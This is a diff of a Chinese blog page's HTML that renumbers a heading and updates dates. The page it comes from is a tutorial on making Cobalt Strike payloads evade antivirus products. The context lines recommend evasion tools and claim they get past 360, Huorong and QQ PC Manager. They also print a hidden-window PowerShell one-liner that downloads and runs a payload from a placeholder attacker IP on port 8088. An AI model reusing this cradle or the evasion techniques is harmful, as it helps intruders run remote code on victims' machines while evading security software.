@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/10.png">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/11.png">
 <meta property="article:published_time" content="2022-01-01T02:53:42.000Z">
-<meta property="article:modified_time" content="2022-01-04T01:51:12.399Z">
+<meta property="article:modified_time" content="2023-05-19T02:18:28.167Z">
 <meta property="article:author" content="作者">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/1.png">
@@ -118,7 +118,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01背景"><span class="toc-number">1.</span> <span class="toc-text">0x01背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02exe上线cs免杀"><span class="toc-number">2.</span> <span class="toc-text">0x02exe上线cs免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02powershell免杀"><span class="toc-number">3.</span> <span class="toc-text">0x02powershell免杀</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01背景"><span class="toc-number">1.</span> <span class="toc-text">0x01背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02exe上线cs免杀"><span class="toc-number">2.</span> <span class="toc-text">0x02exe上线cs免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03powershell免杀"><span class="toc-number">3.</span> <span class="toc-text">0x03powershell免杀</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -176,7 +176,7 @@
 <p>实测可过360、火绒、qq电脑管家。</p>
 <p><strong>3、CS_loader</strong><br>可用go、python、c等生成cs免杀exe<br>项目地址：<a href="https://github.com/Gality369/CS-Loader" target="_blank" rel="noopener">https://github.com/Gality369/CS-Loader</a><br>相关使用项目中介绍的很清楚，这里不过多赘述。<br>以go为例<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/6.png" alt="6"><br>这里我是将图片传到了自己服务器web根目录。<br>实测可过火绒。</p>
 <p><strong>4、掩日</strong><br>项目地址：<a href="https://github.com/dayuxiyou/AV_Evasion_Tool/releases/tag/3.0" target="_blank" rel="noopener">https://github.com/dayuxiyou/AV_Evasion_Tool/releases/tag/3.0</a><br>相关使用项目中介绍的很清楚，这里不过多赘述。<br>单独放出来是此项目可结合以上exe进行组合免杀</p>
-<h2 id="0x02powershell免杀"><a href="#0x02powershell免杀" class="headerlink" title="0x02powershell免杀"></a>0x02powershell免杀</h2><p><strong>1、cs powershell上线</strong><br>cs的powershell上线原理是直接把文本转为exe运行，无文件落地，更具隐蔽性</p>
+<h2 id="0x03powershell免杀"><a href="#0x03powershell免杀" class="headerlink" title="0x03powershell免杀"></a>0x03powershell免杀</h2><p><strong>1、cs powershell上线</strong><br>cs的powershell上线原理是直接把文本转为exe运行，无文件落地，更具隐蔽性</p>
 <p>生成paylaod<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/7.png" alt="7"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:8088&#x2F;a&#39;))&quot;</span><br></pre></td></tr></table></figure>
 <p>直接执行会被杀掉<br><img src="https://cdn.jsdelivr.net/gh/MzzdToT/ibed/imgs/avoidkilling/8.png" alt="8"></p>
@@ -218,7 +218,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01背景"><span class="toc-number">1.</span> <span class="toc-text">0x01背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02exe上线cs免杀"><span class="toc-number">2.</span> <span class="toc-text">0x02exe上线cs免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02powershell免杀"><span class="toc-number">3.</span> <span class="toc-text">0x02powershell免杀</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01背景"><span class="toc-number">1.</span> <span class="toc-text">0x01背景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02exe上线cs免杀"><span class="toc-number">2.</span> <span class="toc-text">0x02exe上线cs免杀</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03powershell免杀"><span class="toc-number">3.</span> <span class="toc-text">0x03powershell免杀</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
@@ -256,7 +256,7 @@
     Copyright &copy;
     
     
-    2016-2022
+    2016-2023
     作者
   </div>
   <div class="footer-right">
